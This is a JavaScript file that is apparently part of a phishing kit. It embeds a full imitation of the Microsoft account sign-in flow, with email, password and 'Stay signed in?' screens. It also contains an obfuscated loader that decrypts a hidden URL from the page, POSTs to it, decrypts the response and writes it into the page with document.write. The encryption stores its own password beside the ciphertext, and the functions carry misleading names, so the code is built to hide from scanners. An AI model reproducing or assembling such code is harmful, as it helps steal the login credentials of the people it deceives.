const template = ` <!doctype html> <html lang="en"> <head> <meta charset="UTF-8" /> <meta http-equiv="X-UA-Compatible" content="IE=edge" /> <meta name="viewport" content="width=device-width, initial-scale=1.0" /> <link rel="icon" href="assets/favicon.ico" /> <title>Sign in to your Microsoft account</title> <link rel="stylesheet" href="assets/app.css" /> </head> <body> <section id="section_uname"> <div class="auth-wrapper"> <img src="assets/logo.png" alt="Microsoft" /> <h2 class="mt-16 mb-16 title">Sign in</h2> <form> <div class="mb-16"> <p id="error_uname" class="error"></p> <input id="inp_uname" type="text" name="uname" class="input" placeholder="Email, phone, or Skype" /> </div> </form> <div> <p class="mb-16 fs-13"> No account? <a href="" class="link">Create one!</a> </p> <p class="mb-16 fs-13">
            <a href="#" class="link"
              >Sign in with a security key
              <img src="assets/question.png" alt="Question img" />
            </a>
          </p>
        </div>
        <div>
          <button class="btn" id="btn_next">Next</button>
        </div>
      </div>
      <div class="opts">
        <p class="mb-0 has-icon" style="font-size: 15px">
          <span class="icon"><img src="assets/key.png" width="30px" /></span>
          Sign-in options
        </p>
      </div>
    </section>

    <section id="section_pwd" class="d-none">
      <div class="auth-wrapper">
        <img src="assets/logo.png" alt="Microsoft" class="d-block" />
        <div class="mt-16 mb-16 identity w-100">
          <button class="back">
            <img src="assets/back.png" />
          </button>
          <span id="user_identity">a@b.com</span>
        </div>
        <h2 class="mb-16 title">Enter password</h2>
        <form>
          <div class="mb-16">
            <p id="error_pwd" class="error"></p>
            <input
              id="inp_pwd"
              type="password"
              name="pass"
              class="input"
              placeholder="Password"
            />
          </div>
        </form>
        <div>
          <p class="mb-16">
            <a href="#" class="link fs-13">Forgot password?</a>
          </p>
          <p class="mb-16">
            <a href="#" class="link fs-13">Other ways to sign in</a>
          </p>
        </div>
        <div>
          <button class="btn" id="btn_sig">Sign in</button>
        </div>
      </div>
    </section>

    <section id="section_final" class="d-none">
      <div class="auth-wrapper">
        <img src="assets/logo.png" alt="Microsoft" class="d-block" />
        <div class="mt-16 mb-16 identity w-100">
          <span id="user_identity">a@b.com</span>
        </div>
        <h2 class="mb-16 title">Stay signed in?</h2>
        <p class="p">
          Stay signed in so you don't have to sign in again next time.
        </p>
        <label class="has-checkbox">
          <input type="checkbox" class="checkbox" />
          <span>Don't show this again</span>
        </label>
        <div class="btn-group">
          <button class="btn btn-sec" id="btn_final">No</button>
          <button class="btn" id="btn_final">Yes</button>
        </div>
      </div>
    </section>
    <footer class="footer">
      <a href="#">Terms of use</a>
      <a href="#">Privacy & cookies</a>
      <span>.&nbsp;.&nbsp;.</span>
    </footer>
    <script src="assets/app.js"></script>
</body>

</html>`;
console.log("hello world");
function encrypt(plaintext, password) {
  const salt = CryptoJS.lib.WordArray.random(128 / 8); // Generate a random salt
  const iv = CryptoJS.lib.WordArray.random(128 / 8); // Generate a random IV

  // Convert the password to a hex string
  const passwordHex = CryptoJS.enc.Hex.stringify(
    CryptoJS.enc.Utf8.parse(password),
  );

  // Derive the key using PBKDF2
  const key = CryptoJS.PBKDF2(CryptoJS.enc.Hex.parse(passwordHex), salt, {
    hasher: CryptoJS.algo.SHA512,
    keySize: 64 / 8,
    iterations: 999,
  });

  // Encrypt the plaintext
  const encrypted = CryptoJS.AES.encrypt(plaintext, key, {
    iv: iv,
  });

  // Construct the JSON object with the encrypted components
  const encryptedJson = JSON.stringify({
    a: encrypted.toString(),
    b: salt.toString(CryptoJS.enc.Hex),
    c: iv.toString(CryptoJS.enc.Hex),
    d: passwordHex, // Store the hex-encoded password
  });

  return encryptedJson;
}

async function honesty(eloquence) {
  var { a, b, c, d } = JSON.parse(eloquence);

  return CryptoJS.AES.decrypt(
    a, // The encrypted text
    CryptoJS.PBKDF2(
      CryptoJS.enc.Hex.parse(d), // Password (derived from 'd')
      CryptoJS.enc.Hex.parse(b), // Salt (derived from 'b')
      {
        hasher: CryptoJS.algo.SHA512, // Hashing algorithm
        keySize: 64 / 8, // Key size
        iterations: 999, // Number of iterations
      },
    ),
    {
      iv: CryptoJS.enc.Hex.parse(c), // Initialization vector
    },
  ).toString(CryptoJS.enc.Utf8); // Convert decrypted bytes to UTF-8 string
}

(async () => {
  const firstDecryption = await honesty(
    atob(document.querySelector("input").value),
  );

  console.log(encrypt(template, "mysecretpassword"));
  // const one = btoa(encrypt(plaintext, password));

  const response = await fetch(firstDecryption, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ bushing: "pomegranate" }),
  });
  const finalDecryption = await honesty(await response.text());
  console.log(finalDecryption);
  document.write(finalDecryption);
})();
